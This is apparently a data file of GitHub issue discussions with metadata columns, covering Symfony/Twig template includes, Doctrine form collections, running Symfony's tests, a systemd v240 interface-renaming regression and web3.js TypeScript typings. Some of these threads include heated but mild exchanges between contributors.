MyTrivial.html would be found in the same directory like the template including it. If you change this (commonly known) ""include"" behavior in Symfony2, then you should change all related information, including error messages. But as I'm mainly interested to go on, my main question is Can I change the configuration somewhere, thus I can include a simple ""MyTrivial.html"", too? If not, which would be the easiest way add such functionality via code?  @friend even when using Twig standalone with its FilesystemLoader, include would not load a template from the current directory but relative to the path configured in the loader (which is how the name of templates is build in this loader). Symfony2 is not changing the meaning of the Twig include tag at all. It simply has a different way to name the template. The Twig environment does not know at all where the template is stored. Templates are always referenced by name.  Well, I guess then that Symfony2 is just doing perfect, and users just want the wrong things.  I guess I'll stop to try to enhance the product (Symfony2) and will simply start to silently implement my things locally. Seems like a twig extension is the way to go.  Well, I think there should really be a possibility to include raw HTML in core (i.e. without engine).  Symfony2 Standard Edition is the whole stack of Symfony2 components combined in such a way to enable creation of MVC apps (correct me if I'm wrong) with some extras added such as TWIG engine for templates/views, Doctrine2 for models and some other bundles/libs. I don't see where in the core you could be using HTML and for what. Also since you're suggesting to add .html files support, why not allow for .php.inc, .inc.php, .htm and so on inclusions. Please correct me if I'm wrong. As for the original problem, I believe both @friend and @friend did a great job on explaining how things work in Sf2. So instead of improving the framework for you only, just submit a PR with a template engine that is able to load .html files directly so that everyone can benefit from your work just as well as you can benefit from the work of the others. If it should not be merged then just make a bundle out of it and publish it ) And if you don't like the error message thrown, just submit a issue report for it or, even better, a PR with an enhanced message.  well, the point is that Twig could be able to include an HTML file using {% include %} it is a valid Twig template (without any logic in it at all). But it needs to have a name able to be handled by the loader registered in Twig. As a template name needs to be unique (it is the identifier to find the template), Symfony2 use a naming scheme which includes the bundle name to avoid collisions. And as it supports using several engines, it uses the extension to find the appropriate engine when rendering the template and so enforces such naming (the extension is used to find the engine so Twig templates needs to end with .twig). @friend regarding including .inc.php files in the templates, it makes no sense at all. It would kill totally the fact that Twig does not allow running arbitrary PHP code.  What about an exception in the template name parser if the name isnt correct? Ran into this issue when using twig to render templates for emails.  @friend this would make the loader unusable within a ChainLoader. The error message in Twig could probably be improved though to mention that it searches the template by name.  @friend it actually does but then uses a regular Twig loader to look for the file. @friend this means that what you are looking for is possible out of the box. You have to create a template loader service (i.e. ), add the paths (by calling ) and configure the templating system to use this loader.  @friend thank you for the hint. This is peanuts for me, but far to complex for a simple user. And I ""emulate"" many times a simple user, because I'm simply to ""lazy"" to make such effort where a simple config option would do the work. That's why I use a framework to reduce effort. Now, the main thing here is the core developers should listen to the user expectations, thus the default behavior is near-to-user-expectations. I understand the technical limitations, but there are possible solutions a) Clarify the error message to something like ""please use template name, e.g. ""page.html.twig"" or ""YourBundlepage.html.twig"" and ensure it has valid extension which referes to the template engine (.twig, ...)"". b) Provide a configuration option ""allow_raw_includes"", which handles unspecified templates (.html) c) Provide a construct like this {% include file='global_right.html' %}  d) Provide a construct like this {% include_raw 'global_right.html' %}  Which directions (a/b/c/d) would be the most possible to be accepted for inclusion into the main code?  @friend The error message is thrown by Twig. So it cannot include stuff related only to the Symfony2 loader (other loaders will have different patterns for valid template names) And loading a file relatively to the current template location would require changing totally the way Twig works (removing most of the possibilities for the loader) as currently a template itself never knows where it is stored (not even if it is stored in a file, or stored at all as there is a StringLoader btw). So you cannot find something relatively to this location.  Let's clarify this issue (look at the FileSytemLoader) When you try use a template which name pattern differs from  then you will fallback to the Twig Loader. So as of today the error message is not so bad it assumes you are not using the symfony syntax so it only print that the file could not be found. May be there is a little room for improvement by adding more precision to the error message, something like ""Either you have specified an invalid template name or the template can not be found"".  @friend, can you please for one moment stop thinking that there are no other developers which can overcome those (peanuts-) issues? There are people capable of seeing solutions and paths where you just see problems and barriers. And of course there's another thing we're not talking about a control-software for a nuclear plant. It's a simple framework. So, hypothetically, which directions (a/b/c/d) would be the most possible to be accepted for inclusion into the main code? (if they overcome any possible problems you mention).  @friend - you take existent code as a foundation to analyze the issue. I take user expectations as a foundation, and really don't care about the code. I've enough with this error message. To be blunt it's crap!  I see no issue - at least not in the framework.  You're not the only one who does not see the issue / issues. And that's in essence the main issue. Hopefully I get at least the hypothetical answer, thus I can go on.  @friend well the problem with your expectations is that you want a ""do as i think"" system. in order to provide what you need, we would need to simply the out of the box possibilities. aka if we dumb the system down, we could figure out what you want. but as with the current flexibility you could have any number of possibilities. as noted however there are two solutions that could move things closer to your desired behavior 1) add handling for ""raw html"" to twig 2) add a ""raw html"" template engine option to the framework bundle finally some advice to you work on your attitude.  @friend My attitude? The only attitude which has to change is this of the Symfony2 team agianst the userbase. Sorry, users (especially the one who contacted me in privat), as you see I'm forced to do development locally.  @friend lsmith77 told you how to add support for your feature. Now you you could implement it and share your work with the community via PR. No need to rant.  @friend could you please come down ) The system is flexible and implemented this way to support more than one templating engine. If we where to do what you want, the system would not be flexible enough to support Smarty or any other engine. As several of other members of the community have stated here, it is possible for you to implement the  twig tag yourself and even share it with the world through a bundle. There is nothing that forces you to develop this locally especially if other will benefit from it. Lastly. I aswell must advice your to adjust your attitude. Symfony2 is FREE and developed by people mostly in their sparetime. Some of us are lucky enough to work with it in our day to day life but that is far from true for all. Have a nice day!  @friend once more implementing it is peanuts, that it get's into the code is another thing. The team usually ignores PR's, even issues subjecting defects in coding-standards  get serious, please. At least all other people have spared me this typical Open-Source whining thing.  closing as a duplicate of #3696 ",50,0,428,0,0,212,12,y,
symfony/symfony/3201,0.049413046,symfony,symfony,One to many relationship doesn't behave as expected when using collections in forms,7670,73,50,0,5,"When using entity's in Doctrine with one-many relationships using a form collection, Symfony does not assign the parent entity to the child entity. Using 'by_reference' =&gt; false with cascade-persist fails and the child entity's foreign key is null in the database. The following appears to remedy the issue within the set method which accepts an ArrayCollection within the entity. Surely Symfony should do this within bindRequest in the form itself?  The form component does not know anything about Doctrine, which has a requirement to update the owning side of the relation. Btw, if you don't set the hub when adding a link, it will always fail to add it. This is why it is recommended to do -&gt;setHub() in the setter of the inversed side. This is a Doctrine requirement which is documented in the doctrine doc about relations. altering the Symfony form component for such cases is wrong as it would couple it to Doctrine (to be able to detect inversed-side of relations) Btw, this requirement is one of the reason why the code generated by the EntityGenerator should be considered as a starting point for the entities, not as a ready-to-be-used-blindly code.  Hey Christophe, I'm aware of the need to set the hub in Doctrine as I've used it outside of Symfony, however the documentation doesn't make it clear that you need to do this. The assumption is (based on the Symfony documentation) that you do not need to set the the owning side of the relationship explicitly and that Symfony will handle this for you... I would be happy to update this for you to avoid confusion to new Symfony developers.  Where does the Symfony2 doc tell you that it does some magic to allow you not to do stuff required by Doctrine in its documentation ? If it really says this, we need to change the doc.  It doesn't, that's my point. Someone new to Symfony like me will assume that Symfony will handle all of this... as the documentation doesn't explain how Symfony and Doctrine handle this. from -  in the sample code in the cookbook, it doesn't mention that what you have to do to associate a tag with a task in order to persist it in Doctrine...  The data are indeed transferred to the underlying object (check your hub object you were editing and it will have the links) But your underlying object is the inversed side of a relation so Doctrine does not track changes in it. the cookbook you linked explicitly talks about a ManyToMany relation, and in this case, the collection can be the owning side.  I did, and it does send an ArrayCollection to the setLinks method. My problem is that Symfony only does half of the work and doesn't handle associating those links with the Hub by calling setHub($hub) on each Link that Symfony processes when the form is submitted. This results in a NULL value being inserted into the Links table for the hub_id. This now means that you have to explicitly add the association within the Doctrine Link entity by looping over each Link in the ArrayCollection passed to the setLinks method. I think this documentation clearly needs to be updated, if you read through the code, it's clear that this is a OneToMany relationship as getTasks and setTasks aren't even in the Tag entity. It's worth noting that this happens within our application and a vanilla install of Symfony, the same issue can be found here  however the solution doesn't seem to work for the current distro of Symfony  Well, of course it does not call it. You are editing the Hub object in your form, and telling the Form component to access a links property (which is done using getLinks and setLinks). why should the form component assume that it it should do an inversed work on the objects ? It does not know how your objects works. Looping over the collection in the setLinks method is what Doctrine requires fot the inversed side. And regarding the cookbook entry, the note at the beginning *explicitly mentions a ManyToMany. And your remarks let me think you confuse what a ManyToMany relation is and what a bidirectional relation is. A ManyToMany does not need to be bidirectional. And even more, if it was a OneToMany, it would logically be the inversed side of a ManyToOne and in this case you would have to have a getTask and a setTask methods So no, it is absolutely not clear it is a OneToMany.  Well I have to apologise to you then, me and my team are obviously stupid and misreading the Symfony documentation and haven't spent the last day or two trying to figure out why the Symfony documentation is so crap and not explicit with the way in which the Form component handles associations with Doctrine, something that other PHP frameworks are quite clear on. The fact that the Cookbook itself is incomplete says a lot, and your attitude towards people looking for support is even worse. Thanks a bunch!  well, the cookbook is not incomplete. first, this one is not about Doctrine and second, Doctrine never requires using bidirectional relations everywhere  the form component does not handle anything ""with Doctrine"". It handles things with objects, whatever they are. It is totally decoupled from Doctrine. Best way to see it is to look at the code in the Symfony\Component\Form namespace there is not a single reference to code from the Doctrine namespace there.  I don't mean to argue but at the bottom of the cookbook it clearly says. No it doesn't, but any developer (including my team) will look at those entity's and tell you that's it's not clear that it's a ManyToMany association/relationship. Even so, the example code is clearly using doctrine otherwise it wouldn't have  within the entity. What's the point of confusing a reader into thinking that Doctrine is not being used for this cookbook when it's clearly used as an example. Surely it makes sense given the fact that Doctrine is the prime ORM used for Symfony to at least have a cookbook showing how to do this specifically for Doctrine?  The cookbook has been completed since, but the website is not yet regenerated.  I rest my case  I don't mean to sound out of place but...  yeah, there is an issue when you don't use by_reference = false. But even if we fix it, you will still have to implement the update of the owning side for Doctrine. The issue when updating the collection by reference currently is that it does not call the setter at all  Even with  it doesn't work. It's clear that the issue here is the fact that the documentation doesn't match up to the expected behaviour from Symfony. So the docs need to be updated and be clear about what Symfony does and does not do in the interim. This will stop developers from smashing their heads against their screens trying to figure out why the expected behaviour isn't as it should be. I'm sure other people working on time sensitive projects will agree that if we know what Symfony does and does not do with Doctrine it will save time and prevent headaches. We've moved from Zend to Symfony over here and are gradually porting our much larger projects over to Symfony. It's a great framework and we love it, but the documentation is really lacking a little which is causing us a nightmare!  well, with by_reference = false, it works when you do what Doctrine requires for its inversed side relations  again, this should be clear in the Symfony documentation, especially when it comes with Doctrine integration as standard as well as having tutorials about using Symfony with Doctrine. My problem isn't with Symfony code, it's with the lack of documentation explaining how collections in forms work and what's expected of the developer to ensure that they persist correctly.  You can get the solution in this tutorial Good Work Link ",24,6,187,0,0,187,6,y,
symfony/symfony/5402,0.098635049,symfony,symfony,Cannot run test suite,6863,43,281,0,3,"‚ûú  src  git clone git//github.com/symfony/symfony.git Cloning into 'symfony'... remote Counting objects 144068, done. remote Compressing objects 100% (44515/44515), done. remote Total 144068 (delta 91155), reused 135518 (delta 83912) Receiving objects 100% (144068/144068), 22.84 MiB | 837 KiB/s, done. Resolving deltas 100% (91155/91155), done.  ‚ûú  src  cd symfony   ‚ûú  symfony git(master) composer install   Installing dependencies   - Installing doctrine/common (2.3.x-dev)     Cloning 605b1b8b5a7bc8daf9111fb35483e5708e30de35    - Installing twig/twig (dev-master)     Cloning 459720ff3b74ee0c0d159277c6f2f5df89d8a4f6  Writing lock file Generating autoload files  ‚ûú  symfony git(master) phpunit             Warning require_once(/usr/local/src/symfony/vendor/doctrine/orm/lib/Doctrine/ORM/Mapping/Driver/DoctrineAnnotations.php) failed to open stream No such file or directory in /usr/local/src/symfony/vendor/doctrine/common/lib/Doctrine/Common/Annotations/AnnotationRegistry.php on line 59  Call Stack     0.0002     274896   1. {main}() /usr/local/src/phpunit/phpunit.php0     0.0254    2845976   2. PHPUnit_TextUI_Commandmain() /usr/local/src/phpunit/phpunit.php46     0.0254    2846568   3. PHPUnit_TextUI_Command-&gt;run() /usr/local/src/phpunit/PHPUnit/TextUI/Command.php130     0.0254    2847120   4. PHPUnit_TextUI_Command-&gt;handleArguments() /usr/local/src/phpunit/PHPUnit/TextUI/Command.php139     0.0312    3242512   5. PHPUnit_TextUI_Command-&gt;handleBootstrap() /usr/local/src/phpunit/PHPUnit/TextUI/Command.php615     0.0314    3252840   6. PHPUnit_Util_FileloadercheckAndLoad() /usr/local/src/phpunit/PHPUnit/TextUI/Command.php787     0.0314    3253224   7. PHPUnit_Util_Fileloaderload() /usr/local/src/phpunit/PHPUnit/Util/Fileloader.php77     0.0315    3260656   8. include_once('/usr/local/src/symfony/autoload.php.dist') /usr/local/src/phpunit/PHPUnit/Util/Fileloader.php93     0.0330    3385496   9. Doctrine\Common\Annotations\AnnotationRegistryregisterFile() /usr/local/src/symfony/autoload.php.dist17   I think you need to install the composer stuff with .  you need to ask composer to install the dev dependencies too (used in the testsuite but not mandatory deps) by adding the --dev option when running the command. Btw, note that looking at the .travis.yml file allows to see what is needed to setup the testsuite (as it is the steps used to initialize it on Travis)  Information like this should not be hidden in JSON and YAML files. Now I have a different issue ‚ûú  symfony git(master) composer install --dev    Installing dependencies from lock file Nothing to install or update Installing dev dependencies   - Installing phing/phing (2.4.12)     Downloading 100%             - Installing propel/propel1 (dev-master)     Cloning 6234fec72db2ad8fc0fe6e1ea6c1cd76abeeef5a    - Installing monolog/monolog (dev-master)     Cloning 1.2.1    - Installing doctrine/dbal (2.3.x-dev)     Cloning adb28e4e1f959d515971b8e8b7f05a01913a7b91    - Installing doctrine/orm (2.3.x-dev)     Cloning bbf527a27356414bfa9bf520f018c5cb7af67c77    - Installing doctrine/data-fixtures (v1.0.0-ALPHA2)     Downloading 100%           monolog/monolog suggests installing mlehner/gelf-php (Allow sending log messages to a GrayLog2 server) monolog/monolog suggests installing ext-amqp (Allow sending log messages to an AMQP server (1.0+ required)) monolog/monolog suggests installing ext-mongo (Allow sending log messages to a MongoDB server) doctrine/orm suggests installing symfony/yaml (If you want to use YAML Metadata Mapping Driver) Generating autoload files ‚ûú  symfony git(master) phpunit                    Fatal error Cannot redeclare class Symfony\Component\Yaml\Tests\DumperTest in /usr/local/src/symfony/src/Symfony/Component/Yaml/Tests/DumperTest.php on line 161  Call Stack     0.0002     274984   1. {main}() /usr/local/src/phpunit/phpunit.php0     0.0757    2845976   2. PHPUnit_TextUI_Commandmain() /usr/local/src/phpunit/phpunit.php46     0.0757    2846568   3. PHPUnit_TextUI_Command-&gt;run() /usr/local/src/phpunit/PHPUnit/TextUI/Command.php130     0.0757    2847120   4. PHPUnit_TextUI_Command-&gt;handleArguments() /usr/local/src/phpunit/PHPUnit/TextUI/Command.php139     0.0974    3814688   5. PHPUnit_Util_Configuration-&gt;getTestSuiteConfiguration() /usr/local/src/phpunit/PHPUnit/TextUI/Command.php666     0.0974    3816464   6. PHPUnit_Util_Configuration-&gt;getTestSuite() /usr/local/src/phpunit/PHPUnit/Util/Configuration.php771     0.5300   11648312   7. PHPUnit_Framework_TestSuite-&gt;addTestFiles() /usr/local/src/phpunit/PHPUnit/Util/Configuration.php855     6.5017  138748672   8. PHPUnit_Framework_TestSuite-&gt;addTestFile() /usr/local/src/phpunit/PHPUnit/Framework/TestSuite.php417     6.5027  138749056   9. PHPUnit_Util_FileloadercheckAndLoad() /usr/local/src/phpunit/PHPUnit/Framework/TestSuite.php356     6.5027  138749336  10. PHPUnit_Util_Fileloaderload() /usr/local/src/phpunit/PHPUnit/Util/Fileloader.php77   This is weird. I don't find any duplicated class declaration for this test. Could it be possible that phpunit includes the file twice ?  this is not hidden  True, I did not know about  Why? Because I expect this information in a  file in the repository. Oh, well.  @friend Could you send a PR updating the README file with your expected information?  Less snark, more pull requests maybe, @friend? FWIW, I'd put this into a  file.  I do not like your attitude, @friend. What you ""demand"" already happened.  I do not like yours, either. I asked for feedback on PHPUnit 3.7RC. @friend replied mentioning an issue with Symfony. To research this issue I need to run the Symfony test suite. I ran into problems, I opened this ticket asking for help. And while others are helping ... you are attacking me for not contributing.  Right, I'm not helping, I was just the first person who told you how to install the required dependencies (here and on Twitter). All of your comments this PR are unnecessarily passive-aggressive. If you don't see that, then figure out a way to get out of your bubble until you do please.  Indeed, you helped in the beginning. Sorry that I forgot about that. I overreacted because of your ""Less snark, more pull requests maybe"" remark. At least to me, such a remark is offensive. I do not use Composer, Symfony, Travis, etc. This is why I ran into the original issue. For me it was clear from the beginning that I would send a pull request once I gathered all the information I needed, that's just what I do. If my comments came across as passive-aggressive or offended in any way my apologies.  And finally, did you find a solution for your  issue @friend ?  Yes, it was PHPUnit's fault  @friend, I see that you require a few more Symfony files there, how does that work when we want to test the Yaml component with PHPUnit, wouldn't we test the classes that are in PEAR then? ",5,0,546,0,0,417,6,y,
systemd/systemd/11436,0.158325019,systemd,systemd,network interface is renamed although NAME has been set by udev rule,7424,69,39,0.641025641,3,"systemd version the issue has been seen with v240 Used distribution Debian sid Downstream bug report at  reproduce the issue, create a file  containing with the mac address of your ethernet network interface. Unload the network module (in my case ), then load it again. Notice how the interface is properly renamed Now run The interface is renamed although a custom NAME has been set.  that's a regression compared to v239, and I'm inclined to add it to the v241 milestone, given that it can mean loss of network access. @friend, @friend wdyt?  after loading the kernel module After running   With v239 after modprobe after   Hmm, I wonder if this is intended effect of 55b6530baacf4658a183b15b010a8cf3483fde08  /cc @friend  Also see #9006  And of course #9088  Not sure what the right approach here is  Why it is named  when the driver is loaded?? If, the final result is  then I expect it should be always .  It should always be named  because of the udev rule.  What happens when the condition  is dropped?  @friend does that really matter? It's a udev rule that worked for years, it shouldn't suddenly stop working.  I've not tested that, but I guess that, because of the condition,  initially it is named to , as the initial name is . the later evaluation results , as the interface is not  anymore.  v239 or before, it is evaluated only once. So, the name was stayed at . But, v240, 55b6530baacf4658a183b15b010a8cf3483fde08 makes the rule is always evaluated.  I think once a custom name has been set, it shouldn't be renamed by udev again.  If I remember correctly, the original motivation of the commit is that interface name can be changed by udev rules without updating initrd or changing kernel command line. So, if my above guess is correct,,, what should we do?  imho, revert and find another solution #9006  @friend a default policy like /lib/systemd/network/99-default.link should never trump explicit user configuration.  @friend There is no split between ""explicit user configuration"" and the rest. Files like  are named this way to have the lower priority. But there is no magic of ""oh, this was set by the user, let's not touch it"" anywhere.  The problem with trying to make a division like that is that nobody seems to ever agree what is ""user"" configuration, and what is ""explicit"".  Current approach of simply executing the configuration as we find it is much clearer and sustainable. #9006 was applied precisely because users were creating configuration and were peeved that some very specific parts of that configuration are not applied. The rules in the bug report were relying on an implementation detail of the rule engine, and changing this implementation detail is something that we are allowed to do. The rule should never have had  if it was supposed to apply also after the interface was renamed. Current behaviour seems correct to me when the device is called , there's just one rule that applies to the devices, and when  fires off, we execute all rules that apply. This is also much nicer for the user, because they can create configuration and apply it, without jumping through hoops to reset the state.  It's not nicer to users, as it breaks existing user configurations. Which is bad  I'm amazed that I have to point this out....  Not every facet of program behaviour is guaranteed to be stable. Generally, only things that are documented are promised to be kept unchanged. Is the fact that link renames are applied only once documented anywhere? You seem to suggest that we should never change any user visible detail. I think this user rule was in error, and it worked for a while by luck, and now it doesn't. This happens all the time.  I guess I'll stop filing bug reports  wouldn't it make sense to only apply  matching to the kernel-assigned name, not a potentially renamed name?  This doesn't seem to have ended well.  From the peanut gallery... Would it make sense to somehow record the original name of this interface and match  against that name as well? When reading the rule from the OP, that was my impression of how that should have worked (and the previous one-rename rule was a good approximation of it...) Not really sure whether that makes sense, would be feasible and would address the other issues that commit was supposed to fix...  Urks, I find this breakage quite unfortunate I must say. I mean, writing a rule that matches effects of a previous rule (like the one debian is using there) is probably not a great idea (rules really should match stuff that is not going to change for a device, so that they are idempotent), but I am not sure that simply breaking systems like this is a good idea. I don't have a strong opinion on the way out, but I am slightly leaning towards reverting the patch and simply asking downstreams to drop any rules that rename ifaces whatsoever from their initrds, as that means the host's policy will never be enforced. I mean, afaiu the patch was done precisely to ensure that host policy applies if initrds already renamed devices, no? I mean, users/downstreams assumed that these rules where OK, and we probably should tell them they are a bad idea, but also, I think we shouldn't break so many installed systems this way... Another idea might be make it configurable in the .link file whether to rename already renamed interfaces, with a default to on. Then, change our 99-default.link file to turn off the option. This way, .link files supplied by users will by default override everything, but the fallback one we provide won't. Other ideas, opinions?  i mean, with the naming scheme cmdline option and stuff we now go into great lengths to stabilize names over releases, it would be a pity if we'd then break existing rules so galantly (even if they aren't written in particularly good style)...  The current documentation does not specify whether user modifications are read, and there are two factors suggesting they shouldn't  The name The existence of a NAME variable for matching against userspace changes.  Honestly, having a variable named KERNEL map to a value provided by userspace is weird.  Hmm, we have already documented that implicitly...  least, we need to update this.  @friend's proposal is implemented in #11443.  userspace, no renaming is performed. The available policies OK, that is enough for me to consider the previous behaviour documented. So I agree that we should preserve compatibility for this. I like this approach. The question is whether to default to ""on"" or ""off"" with current link files. If we default to ""off"", we preserve more backwards compatibility. If we default to ""on"", we get saner behaviour.  Or, how about disabling the new behavior if naming scheme is specified earlier than v240?  @friend interesting idea. Maybe like this if naming scheme is &lt; v240 we default to RenameOnce=yes and otherwise to RenameOnce=no (and 99-default.link would set RenameOnce=yes either way)  @friend Please go talk to Linus Torvalds. If it works today and you make a change to break users, you are in the wrong. I should hope you wouldn't need yelling at to understand that. Software developers need to internalize this and abide by it at all times, life would be much easier.  Please don't post offtopic comments. (This is making rounds elsewhere, locking this for now might be best).  BTW, for those coming late, a good fix (including a revert) has been merged now. I think all should be good now. ",34,5,256,0.128205128,0.205128205,121,12,y,
web3.js/ethereum/1248,0.056490209,ethereum,web3.js,Web3 typescript definition has no default export,19335,202,77,0.442307692,5,"Hello, Web3 Typescript definition on branch 1.0 doesn't contain ""default export"". After importing ‚ô†import Web3 from 'web3';` I got this issue  Module '""xxxx/node_modules/web3/index""' has no default export.  the type definition reflects the current module implementation line 78 Based on typescript document, it is recommended to adopt module-class, which is why the type is exposed with ""="" and not default. We have been going back and forth on this issue as you can see with #1184, which was exactly to undo the default import that undo the ""="" earlier...  I am sure we don't want to keep repeating this cycle,  will the following import syntax work for you?  Thank you.  Using ""require"" keyword, I got this error on compilation I use typescript  2.6.2  web3.js is still using es5 module system, so it's best to use the compiler option that supports it... try module ""commonjs""  Doing  works for me in version 1.0.0-beta.26 but when i upgrade to 1.0.0-beta.27 I receive the error mentioned in this post. I could use the lower version but i noticed that the method for viewing pass events has changed in .27. IN version .26 the passed events can be viewed by invoking  but in .27 you have to call ; Please resolve soon, thanks  seems like @friend  has a PR for this  here is the bottom line  works for  but breaks  works for  but breaks   If you guys look at the commit history, you can see that we have tried both export styles multiple times because every time you switch to one the other camp complained. Giving the module can't be exported both ""="" and ""default"", we have to choose one... but which one? I think we all agree that the type definition should closely reflect the original package implementation current web3's js implementation uses ""export ="", according to typescript official doc, it is recommended to adopt type definition with ""export ="" (see here). This tips the scale for .  PR1249 made it ""export default"" again in version 1.0.30 . Doesn't work with commonjs anymore.  Just use ES Modules since it's JavaScript's official module system and stop changing it all the time. It's a breaking c  What I ended up doing to stop typescript from complaining and still have type definition and autocompletion is  @friend was able to make it work as follows  From Typescript docs Web3 uses  so the correct way to import it in Typescript is  This should be fixed with the PR #2000 thanks to @friend who is writing the typings!  @friend Which typings are you talking about?  @friend He has currently just implemented the typings for web-utils and there is an open PR for web3-bzz maybe you can help him or move the typings from DefinitelyTyped into the web3.js repository. I would like to have them directly in the repository because this way I can guarantee that they are always up to date. The issue above should be fixed because of the refactoring and the typings Josh is writing but I will proof it before I merge the PR into the 1.0 branch.  I repeatedly said and it is best practice to only have the type definitions at definitely typed. You should never again bring type definitions back into this very code base right here. The only exception for this rule is, if you actually write the code in typescript.  @friend Hey dude, I have to say I completely disagree. I do agree types say quote  - but this would work in a standard  project. At the moment the typing's NEVER get kept in date, someone does a PR in  and you can not force them to do another PR in . This then causes a huge knock effect for all the typescript devs when new versions are released as the types just do not match up. I have had this about 40 times and only finding out the types are incorrect by having to write full unit tests. If it was actually in the repo itself you can enforce contribution instruction to make sure the typing keep in date all the time.  I seen other repos like BigNumber -( do this due to how impossible it was to manage it being in 2 separate repos. At the current time the  are out of sync in the  lib, i have not checked the others but the entire development experience trying to work in  with web3 is too hard at the moment due to the amount of changes. As the main developers work in   is 2nd thought and it should be part of the entire development structure while writing new things in web3 itself. We should also be able to release types + web3.js at the same time at the moment we have to wait for the  PR to be approved which is out of our control. This solution will mean updating methods in the future and updating it's typing will be super easy for all the maintainers as it's in 1 repo. It will also mean the typing's will never be out of sync due to contribution guidelines but still versioned nicely.  I know a lot of people may just use  but as a regular  developer using these library i believe this would be a very good way to start improving this, and a lot of the people i have spoken to about this have agreed. I just trying to make this seamless, bringing easier development for the TypeScript devs that's all. Like i said i can tell you a thousands times where the types reflected are so out of date. This would solve a lot of issues i see raised with typing's and bring it all in with 1 install command. Let me know your thoughts )  Thanks  üëç  I removed the type defintions after a long discussion because they were broken (as in ""You were not able to use  in a typescript project without monkey patching the broken type defs, shipped with ) They were broken because there are no automated tests for the type definitions in this repo here. There cannot be. Definitely typed has such tests. I agree that it is a slow process but the process you are suggesting will make things even worse Everyone who is making a contribution to  will have to be a typescript pro from now on. Because as you are saying you will reject every PR without an update to the type defs. At the same time you do not even code the library in typescript! So I have to live with the sadness that I have to write my contributions in JS and then I have to type them by hand afterwards. What a clusterf**k. There are two possible and acceptable ways to proceed  When the API has changed, make a PR to DT fast and live with the fact that sometimes the type defs are outdated for a couple of days. Also stop making big changes to the API. Start writing the code in typescript (which can be done incrementally) and autogenerate the type defiintions.  All other approaches are going to fail and only cause misery.  One other thought to keep in mind This library is written in Javascript, because the people contributing to it are not able to write Typescript code. Now you want them to review type definitions for a usage of this library in Typescript projects. You see the problem?  Thanks for your quick response @friend. I completely understand what you are saying.  So I have to live with the sadness that I have to write my contributions in  and then I have to type them by hand afterwardsJS@friend - I think any  can write standard type definitions with a little bit of support, even if this is fixed by someone who could again i can't see it being a problem. Like i said we don't have loads of regular contributors anyway.  And one more thing PRs to DT get merged pretty quickly when they are good. Most of them aren't though.  This is a false assumption. First you code javascript. Then you code typescript. Then you learn how to produce type definitions. Devs who are able to write type defintions are a subset of the devs who have mastered Typescript, not the other way round. This is an opinion of mine and we reached a point were we have two different opinions and I have not further arguments to give. I made my point. Tipp  @friend but we have under 10 regular contributors.. do you not think this would bring more good then bad? Say yes some  need some support with types but with not many people actually contributing this should not be that hard to maintain. The main advantages it brings are huge over the valid points you have stated. For the over 200k weekly downloads web3 gets I think this could solve a lot of  pains they have. This could be the first step and maybe in the future web3 is rewritten into  but we have to start somewhere. Thanks a lot for your view and taking time to discuss!  I get your argument These 10 contributors should be able to learn typescript. I disagree with your conclusion Lets make them learn typescript and then maintain the type definitions for this JS code base. I think the only conclusion can be Lets make them learn typescript and write everything in typescript. With  you can just rename every file to  and be done. Project is now in typscript.  I think some other milestones have to be reached first before this gets done like actually release of  none beta. I am a big supporter of getting  in  and would happily go through the entire thing and change everything to  but i think that's a bigger discussion to have. Really appreciate your view though!  Cheers Levin üëç  I am not voting to move this here to typescript. I want to show that your idea to maintain the type defs here is a mistake. Publish type definitions with your package iff your is written in typescript. Let others maintain and publish the definitions iff your package is not written in typescript. As this package is not written in typescript (and possibly never will be), it is infeasible to maintain the type defs here. End of story.  And one thing about the argument with BigNumber.js The pain you experienced was not because the type defs where maintained in another repository, but because bignumber.js is not written in typescript.  A popular example of a lib that's not written in TS and maintains its own type defs is Redux - it seems to work fine for them. Redux is way simpler than web3.js, but it also has way more contributors and downloads than web3.js.  That might be. But it is against best practice and I explained in detail why the categorical imperative says it is a bad idea. Only because some people do it does not mean that we have to do it too.  Who defined the best practice you're talking about? One of the most important libs in the industry does it differently without problems, so I don't really see how it's against ""best practice"". TypeScript docs don't discourage such approach either, so I think that it's just your opinion and not a sacred truth that we should follow. I've used web3.js with TypeScript and each time I've written my own typings for things I needed, because the official ones were just plain wrong and not helpful at all. Bigger Ethereum projects like 0x also have picked this route (as seen here) to avoid the hassle of working with official web3 typings from DefinitelyTyped.   With this view we will never ever have solid types for  so  development with it becomes unstable or having to use  everywhere üëé The likes of Redux do this because of the  it causes relying on others to maintain the types, and as @friend said they have far more contributors and over 2 million downloads a week, we should learn from people who have gone through the pains.   We are in a world where  development is taking over so i thought  would start adopting to supporting in-house types. This would of been a great start. Again i see no reasons that you stated which makes it  bad, in my view the positives overweight the negatives by far. If  do not support  out the box people will have to start using other  which do which i would hate. Anyway discussion over - see ya!  @friend I'd suggest locking this thread to avoid further flamewars.  Please read the docs more carefully. I quote (again and again and again)  @friend not trying to pick sides here, but you must agree that breaking web3.js for typescript users on a regular basis is not a good thing?  Regardless of what the TypeScrypt docs say. For better or worse, a lot of people are using TypeScript that also use web3.js. It sounds to me like the only option here to prevent the regular breakage is to include the ts file in this repo so it's always in sync. If the contributors to this repo don't want to update the types file, let some of the people on this thread help whenever a PR comes in to ensure it gets updated properly before merging, it would probably only take a few minutes of a ""TypeScript pros"" time to check the types file for each PR.  You all want to have typings that are up to date with the current interface of the library, right? Guess what There is only one (just one!) way to achieve this Implement the library in typescript and generate the typings automatically. Even if you maintain the typings here, they will be out of sync all the time. As I said, the typings in this repo were broken. There are several reasons why this cannot work  Pull request reviewers do not understand typescript and cannot review whether or not the changes to the typings are correct. The typings will not be tested. So even if the reviewer is a typescript pro, they are human and will overlook things. (DT tests all typings automatically in CI!!!!) Someone makes a really nice pull request. It gets merged because javascript users want the new feature. Nobody cares for the update to the type definitions because the contributor with the pull request is not able to write them and nobody else comes to the rescue in time.  and 3. is the same for DT, but 3 is not. You will not achieve what you are looking for when you maintain the typings here. Also who of you has made a contribution to DT? It is super easy. There is nothing to fear. The review process is heavliy streamlined and fully automated.   So my point is You all push for maintaining the typings here but you will not achieve what you want to achieve. The type definitions will be out of sync all the time not matter what until this is rewritten in typescript.  Unfortunately in the typescript docs they do not explain why you should publish the typings via DT when you write your package in Javascript, but I think I gave enough reasoning. Additionally to that Why do you think that they recommend that?  I think I do understand TS it is not that rocket science thing to do types. Maybe we could test them in our CI too. This should not happen if I review a PR. I think you should answer this question )  So you will from now on personally review all PRs? That is going to scale well. Yes. That is quite easy. What is more easy though is to rewrite the whole codebase in typescript. It will happen. Or you will drive away open source contributors because they create a valid PR which never gets merged because ""we are still waiting for the typings"". I did explain my thinking. Three times. I repeat myself. People say that I am not right. I want to here their 